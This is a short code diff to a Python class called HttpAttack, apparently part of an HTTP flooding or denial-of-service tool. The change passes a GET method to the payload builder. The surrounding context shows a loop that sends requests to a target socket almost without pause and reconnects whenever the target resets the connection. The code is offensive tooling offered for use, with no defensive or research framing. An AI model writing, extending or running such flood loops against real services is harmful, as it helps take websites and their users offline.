@@ -4,7 +4,7 @@ from time import sleep
 from attacks.http.services import HttpService
 from constants import CRLF
 from shared.attacks import AttackRequest
-from shared.attacks.http import HttpAddress
+from shared.attacks.http import HttpAddress, HTTPMethods
 
 
 class HttpAttack:
@@ -36,7 +36,8 @@ class HttpAttack:
 
         while self._service.ping(sock):
             try:
-                sock.send(self._service.http_payload)
+                sock.send(self._service.http_payload(method=HTTPMethods.GET))
                 sleep(0.0001)
+
             except (BrokenPipeError, ConnectionResetError):
                 sock = self._service.get_socket(address.target)
